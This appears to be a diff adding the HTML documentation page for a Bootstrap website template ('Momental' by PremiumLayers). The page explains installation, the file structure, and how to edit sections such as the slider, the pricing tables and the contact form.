+<noscript><i>Javascript required</i></noscript>
+
+
+	<h4><strong>Template Features</strong></br></h4>
+
+	<ul class="list">
+          	<li>Clean &amp; Simple Design</li>
+		<li>Advance Bootstrap 3 Framework</li>
+          	<li>HTML5 &amp; CSS3</li>
+     		<li>Fully Responsive Design</li>
+		<li>Mutipurpose Concept</li>
+		<li>All files are well commented</li>
+		<li>Crossbrowser Compatible with IE8+, Firefox, Safari, Opera, Chrome</li>
+		<li>Extensive Documentation</li>
+	</ul>
+
+	<p>Go ahead to know more.</p>
+	</section>
+
+
+
+	<section id="installtion">
+	<div class="page-header"><h3>Installing Template</h3><hr class="notop"></div>
+
+	<p>After unzip the download pack, you'll found a <strong>Template Folder</strong> with all the files.
+	<br>
+	<br>
+	You can view this Template in any browser, you can display or edit the Template without an internet connection.
+	<br>
+	<br>
+	The two sections that will not work is the <strong>Google map</strong> Section which contains external link to get the map source.
+	<br>
+	<br>
+	and <strong>Contact form</strong> which uses PHP, so will work only online.
+	<br>
+	<br>
+	Now open your FTP Client (like Filezilla) or directly through cpanel,  upload the content of the Template on your server root.
+	<br>
+	<br>
+	Once the files are done uploading go to www.yourdomainname.com/index.html
+	</p>
+<br>
+<br>
+<br>
+<br>
+
+</section>
+
+	<section id="html_structure">
+	<div class="page-header"><h3>HTML Structure</h3><hr class="notop"></div>
+
+	<h4><strong>HTML Structure</strong></h4>
+
+<p>This Template has a Responsive layout and is based on the <strong>Bootstrap Framework</strong>. For more information about this visit <a href="http://getbootstrap.com/">Bootstrap.</a>
+<br>
+<br>
+The default Bootstrap grid system utilizes 12 columns, making for a 1170px wide container without responsive features enabled. With the responsive CSS file added, the grid adapts to be 724px and 1170px wide depending on your viewport. Below 767px viewports, the columns become fluid and stack vertically.</p>
+
+<h4><strong>Basic Grid HTML</strong></h4>
+
+<p>For a simple two column layout, create a .container and add the appropriate number of .col-md* columns.
+<br>
+<br>
+Given this example, we have .col-md-4 and .col-md-8, making for 12 total columns and a complete row.
+
+<pre name="code" class="html">
+<div class="container">
+    <div class="col-md-4">...</div>
+    <div class="col-md-8">...</div>
+</div>
+</pre>
+
+<br>
+
+<h4><strong>Nesting Columns</strong></h4>
+
+<p>To nest your content with the default grid, add a new .container and set of .col-md* columns within an existing .col-md* column. Nested rows should include a set of columns that add up to the number of columns of its parent.
+<br>
+<br>
+
+<pre name="code" class="html">
+<div class="container">
+    <div class="col-md-9">
+        Level 1 column
+        <div class="row">
+            <div class="col-md-8">Level 2</div>
+            <div class="col-md-4">Level 2</div>
+        </div>
+    </div>
+
+    <div class="col-md-3">
+        Level 2 column
+    </div>
+</div>
+</pre>
+
+
+
+</section>
+<section id="css_files_and_structure">
+	<div class="page-header"><h3>CSS Structure</h3><hr class="notop"></div>
+
+<p>These are the css files that are loaded into templates in Head Section.</p>
+
+<pre name="code" class="html">
+	<!-- CSS -->
+	<link href="css/bootstrap.css" rel="stylesheet">
+	<link href="font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="css/style.css" rel="stylesheet">
+	<link href="js/owl-carousel/owl.carousel.css" rel="stylesheet">
+	<link href="js/owl-carousel/owl.theme.css" rel="stylesheet">
+	<link href="css/style-responsive.css" rel="stylesheet">
+	<link href="css/prettyphoto.css" rel="stylesheet">
+	<link href="js/easytabs/easy-responsive-tabs.css" rel="stylesheet" />
+	<link href="js/flex-slider/flexslider.css" rel="stylesheet" />
+
+</pre>
+<p>Dont change anything in bootstrap.css file. It may affect the whole theme.</p>
+
+<br>
+
+<h4><strong>Google Web Fonts</strong></h4>
+<p>By default, the template loads this font from Google Web Font Services, you can change the font with the one that suits you best.</p>
+<pre name="code" class="html">
+	<!-- Custom Google Web Font -->
+     <link href="http://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
+     <link href='http://fonts.googleapis.com/css?family=Roboto:400,100,100italic,300,300italic,400italic,500,700,900' rel='stylesheet' type='text/css'>
+     <link href='http://fonts.googleapis.com/css?family=Raleway:400,100,100italic,200,300,300italic,400italic,500,700,900' rel='stylesheet' type='text/css'>
+     <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,100,100italic,200,300,300italic,400italic,500,700,900' rel='stylesheet' type='text/css'>
+</pre>
+	
+
+</section>
+<section id="javascript">
+	<div class="page-header"><h3>Javascript</h3><hr class="notop"></div>
+
+	<p>These are the JS files that are loaded into templates in end of the Body Section.</p>
+
+<pre name="code" class="html">
+
+<!-- JavaScript -->
+<script src="js/jquery.js"></script>
+<script src="js/bootstrap.min.js"></script>
+<script src="js/easytabs/easyResponsiveTabs.js"></script>
+<script src="js/jquery.appear.js"></script>
+<script src="js/html5shiv.js"></script>
+<script src="js/respond.js"></script>
+<script src="js/jCProgress-1.0.3.js"></script>
+<script src="js/jquery.easing.min.js"></script>
+<script src="js/owl.carousel.js"></script>
+<script src="js/jquery.prettyphoto.js"></script>
+<script src="js/flexslider/jquery.flexslider.js"></script>
+<script src="js/main.js"></script>
+<script src="http://maps.google.com/maps/api/js?sensor=true"></script>
+<script src="js/gmaps.js"></script>
+
+</pre>
+
+
+
+
+</section>
+<section id="tutorial">
+	<div class="page-header"><h3>Tutorial</h3><hr class="notop"></div>
+<p>Lets start updating the template. Open index.html file and follow the steps.</p>
+
+<p>Most of the updates are same for all versions. So will explain once here.</p>
+
+<h4 class="sub-head">Header - Logo</h4>
+	
+<pre name="code" class="html">
+	<a class="navbar-brand" href="./index.html"><img src="img/logo.png" class="img-responsive" alt=""/></a>
+</pre>
+
+<ol>
+<li>Replace "images/logo.png" with the your logo url or source.</li>
+</ol>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Top Slider.</h4>
+
+<pre name="code" class="html">
+
+					<div id="intro">
+						<div id="intro-slider" class="owl-carousel owl-theme">
+							<div class="item"><img src="img/slider/intro/1.jpg" class="img-responsive" alt=""></div>
+							<div class="item"><img src="img/slider/intro/2.jpg" class="img-responsive" alt=""></div>
+							<div class="item"><img src="img/slider/intro/3.jpg" class="img-responsive" alt=""></div>
+						</div>
+					</div>
+</pre>
+
+
+<ol>
+<li>Replace "img/slider/intro/1.jpg" with yor first slider image.</li>
+<li>Same for all slides</li>
+<li>Unlimited Slides can be added</li>
+</ol>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Navmenu</h4>
+
+This is the basic structure.
+
+<pre name="code" class="html">
+<nav>
+		<ul class="nav navbar-nav navbar-right">
+			<li class="current"><a href="MENU_LINK_HERE">Menu title</a></li>
+			<li><a href="MENU_LINK_HERE">Menu title 1</a></li>
+			<li><a href="MENU_LINK_HERE">Menu title 2</a></li>
+		</ul>
+</nav>
+</pre>
+
+<ol>
+<li>Replace "<strong>Menu title</strong>" with the menu name.</li>
+<li>Replace "<strong>MENU_LINK_HERE</strong>" with the menu link.</li>
+<li>Same for all. You can add unmited menus.</li>
+</ol>
+
+<br>
+<hr>
+
+
+<h4 class="sub-head">Tab Content</h4>
+
+This is the basic structure
+
+<pre name="code" class="html">
+					<div id="features-tab" data-animated="0">
+					
+						<!-- Tab nav -->
+						<ul class="nav-tabs" role="tablist" id="myTab">
+							<li class="active"><a href="#tab1" role="tab" data-toggle="tab">TAB_TITLE</a></li>
+							<li><a href="#tab2" role="tab" data-toggle="tab">TAB_TITLE</a></li>
+							<li><a href="#tab3" role="tab" data-toggle="tab">TAB_TITLE</a></li>
+						</ul>
+
+						<!-- Tab panes -->
+						<div class="tab-content">
+							<div class="tab-pane active fade in" id="tab1">
+tab1 content goes here...
+							</div>
+							<div class="tab-pane fade" id="tab2">
+tab2 content goes here...
+							</div>
+							<div class="tab-pane fade" id="tab3">
+tab3 content goes here...
+							</div>
+						</div>
+					</div>
+
+</pre>
+
+<ol>
+<li>replace "TAB_TITLE" with your table title</li>
+<li>replace "tab1 content goes here..." with the tab content</li>
+<li>Same for all tabs</li>
+</ol>
+
+<br>
+<hr>
+
+
+<h4 class="sub-head">Portfolio</h4>
+
+Find this code
+
+<pre name="code" class="html">
+							<div class="col-md-4" data-animated="0">
+								<div class="mp-thumb">
+									<img src="img/projects/1.jpg" class="img-responsive" alt=""/>
+									<div class="overlay1">
+										<h4>Shtipalkat e drunit</h4>
+									</div>
+									<div class="overlay1-hr">
+										<a href="#" class="link"><i class="fa fa-file-text-o"></i></a>
+										<a href="img/projects/1.jpg" class="prettyPhoto zoom"><i class="fa fa-search"></i></a>
+									</div>
+								</div>
+							</div>
+</pre>
+
+<ol>
+<li>replace "img/projects/1.jpg" with the project image thumb (pls use large image, so it will look fine in lightbox)</li>
+<li>replace the text between "&lt;h4&gt;" "&lt;/h4&gt;" with the project title.</li>
+<li>replace "#" with the link to single portfolio page.</li>
+<li>Same for all.</li>
+</ol>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Pricing table</h4>
+
+<pre name="code" class="html">
+							<div class="col-md-4">
+								<div class="pricing-table">
+									<div class="mp-icon"></div>
+									<div class="mp-title">Basic</div>
+									<div class="mp-price"><small>$</small>40<span>.99<em>month</em></span></div>
+									<ul>
+										<li><i class="fa fa-check-circle"></i> Unlimited Bandwith</li>
+										<li><i class="fa fa-times-circle"></i> Professional Cpanel</li>
+										<li><i class="fa fa-check-circle"></i> Unlimited E-mails</li>
+										<li><i class="fa fa-times-circle"></i> 24/7 Support</li>
+										<li><i class="fa fa-check-circle"></i> High Security</li>
+									</ul>
+									<div class="mp-btn"><a href="#">Select this plan</a></div>
+								</div>
+							</div>
+</pre>
+
+<ol>
+<li>replace the text between "&lt;div class="mp-title"&gt;" "&lt;/div&gt;" with the plan title.</li>
+<li>replace the text between "&lt;div class="mp-price"&gt;" "&lt;/div&gt;" with the plan price.</li>
+<li>replace the text between "&lt;li"&gt;" "&lt;/li&gt;" with the plan features.</li>
+<li>replace "Select this plan" with the choose plan button text.</li>
+<li>Same for all</li>
+</ol>
+<br>
+<hr>
+
+
+<h4 class="sub-head">Testimonials</h4>
+<pre name="code" class="html">
+
+									<div class="item">
+										<img src="img/quote/1.png" class="img-responsive" alt="">
+										<p>Nam nec tellus a odio tincidunt auctor a ornare odio. Sed non  mauris vitae erat consequat auctor eu in elit class aptent taciti sociosqu ad litora</p>
+										<i class="fa fa-user"></i>
+										<cite>John Smith, CEO at <span>Envato</span></cite>
+									</div>
+				
+</pre>
+
+
+<ol>
+<li>Replace "img/quote/1.png" with the quote author image source.</li>
+<li>replace the text between "&lt;p"&gt;" "&lt;/p&gt;" with the quote text.</li>
+<li>replace the text between "&lt;cite"&gt;" "&lt;/cite&gt;" with the quote author name and profession.</li>
+<li>same for all.</li>
+</ol>
+
+<br>
+<hr>
+
+
+<h4 class="sub-head">Timeline</h4>
+
+<strong>This is the basic structure</strong>
+
+<pre name="code" class="html">
+						<ol id="timeline">
+							<li class="t-left" data-animated="0">
+								<div class="t-time">Lorem ipsum<span>2000 - 2005</span></div>
+								<p>Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor, nisi elit</p>
+							</li>
+							<li class="t-right" data-animated="0">
+								<div class="t-time">Dolor sit<span>2000 - 2005</span></div>
+								<p>Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor, nisi elit</p>
+							</li>
+							<li class="t-left" data-animated="0">
+								<div class="t-time">Aenan Auctor<span>2000 - 2005</span></div>
+								<p>Proin gravida nibh vel velit auctor aliquet. Aenean sollicitudin, lorem quis bibendum auctor, nisi elit</p>
+							</li> 
+						</ol>
+</pre>
+
+<ol>
+<li>"t-right" will place the content on right and "t-left" on the left side.<li>
+<li>Do the same for all.</li>
+<li>Add unlimited timeline slides</li>
+</ol>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Skill Content</h4>
+<pre name="code" class="html">
+
+						<div class="round-skills">
+							<div class="row ms-wrap">
+								<div class="col-md-4">
+									<div class="skill-wrap">
+										<div id="skill1"></div>
+									</div>
+									<h4>Development</h4>
+								</div>
+								<div class="col-md-4">
+									<div class="skill-wrap">
+										<div id="skill2"></div>
+									</div>
+									<h4>Design</h4>
+								</div>
+								<div class="col-md-4">
+									<div class="skill-wrap">
+										<div id="skill3"></div>
+									</div>
+									<h4>Print</h4>
+								</div>
+							</div>
+						</div>
+	
+</pre>
+
+
+<ol>
+<li>Open "main.js" file from "JS" folder and find this.</li>
+<li>find "skill1" and next to it you can see "45". Its the avargae for skill1.</li>
+<li>replace it with your skill percentage.</li>
+<li>same for all.</li>
+</ol>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Contact Form</h4>
+<p><strong>Open "contact.php" from the folder "PHP" in theme file.</strong></p>
+
+<ol>
+<li>Find "<strong>YOUR NAME HERE</strong>" and replace it with your name.</li>
+<li>Find "<strong>YOUR EMAIL ID HERE</strong>" and replace it with the email id, where you want to receive the mail.</li>
+</ol>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Contact info</h4>
+
+Open "contact.html" file and find this
+
+<pre name="code" class="html">
+	<div class="contact-info" data-animated="0">
+		<h4>Contact Info</h4>
+		<ul>
+			<li><i class="fa fa-home"></i> lorem ipsum street</li>
+			<li><i class="fa fa-phone"></i> +399 (500) 321 9548</li>
+			<li><i class="fa fa-envelope"></i> info@domain.com</li>
+		</ul>
+	</div>
+</pre>
+
+<ol>
+<li>Replace "lorem ipsum street" with the Company address.</li>
+<li>Replace "+399 (500) 321 9548" with the Company contact number.</li>
+<li>Replace "info@domain.com" with the Company email.</li>
+</ol>
+
+
+<br>
+<hr>
+
+<h4 class="sub-head">Google Map</h4>
+
+Open "contact.html" file and find this
+
+<pre name="code" class="html">
+	lat: 40.714353,
+	lng: -74.005973,
+</pre>
+
+<pre name="code" class="html">
+Click this <a href="http://itouchmap.com/latlong.html" target="_blank">link</a>, type your address and replace the latitude and longitude codes.
+</pre>
+
+<br>
+<hr>
+
+<h4 class="sub-head">Footer Copyright</h4>
+
+<pre name="code" class="html">
+				<p>&copy; 2014 Momental. All Rights Reserved</p>
+</pre>
+
+<ol>
+<li>replace "&copy; 2014 Momental. All Rights Reserved" with the copyright info.</li>
+<li>replace the social links as per the name.</li>
+</ol>
+
+</br>
+</br>
+<hr>
+
+<h2 style="margin-bottom:30px;">Thats it. You are done. Now your website is ready to launch.</h2>
+<hr>
+
+<section id="sources_and_credits">
+	<div class="page-header"><h3>Sources and Credits</h3><hr class="notop"></div>
+<p>We have used the following plugins, fonts & images. All fonts, images, icons used in this template are free for commercial use.</p>
+
+<strong>Fonts</strong>
+<ul>
+<li><a href="http://www.google.com/webfonts/specimen/Montserrat">Montserrat</a> from google webfont.</li>
+<li><a href="http://www.google.com/webfonts/specimen/Roboto">Roboto</a> from google webfont.</li>
+<li><a href="http://www.google.com/webfonts/specimen/Raleway">Raleway</a> from google webfont.</li>
+<li><a href="http://www.google.com/webfonts/specimen/Open+Sans">Open Sans</a> from google webfont.</li>
+</ul>
+
+<br>
+
+<strong>jQuery Plugins</strong>
+<ul>
+<li>Flexslider plugin by <a href="https://www.woothemes.com/flexslider/">woothemes</a></li>
+<li>Owlscroll carousel plugin by <a href="http://owlgraphic.com/owlcarousel/?">owlgraphic</a></li>
+
+</ul>
+
+<br>
+
+<strong>Images</strong>
+<ul>
+<li>Images used from <a href="#">Source name</a></li>
+</ul>
+
+Images in live preview are not included to the template.
+
+</ul>
+
+<br>
+
+</section>
+
+<br>
+<br>
+<br>
+<br>
+<br>
+<p>Once again, thank you so much for purchasing this theme.<br>As I said at the beginning, We'd be glad to help you if you have any questions relating to this theme. We I'll do our best to assist.</p> 
+Thanks
+<h4>PremiumLayers</h4>
+
+
+	</div>
+
+
+
+
+	<script language="javascript" src="assets/js/shCore.js"></script>
+	<script language="javascript" src="assets/js/shBrushCss.js"></script>
+	<script language="javascript" src="assets/js/shBrushXml.js"></script>
+	<script language="javascript" src="assets/js/shBrushJScript.js"></script>
+
+	<style type="text/css" media="screen">
+		p, table, hr, .box { padding-bottom:15px; }
+		.box p { margin-bottom:10px; }
+		pre, code{ 
+		font-size: 14px;
+		margin:1.5em 0;
+		white-space:pre;
+		}
+	</style>
+
+
+</body>
+</html>
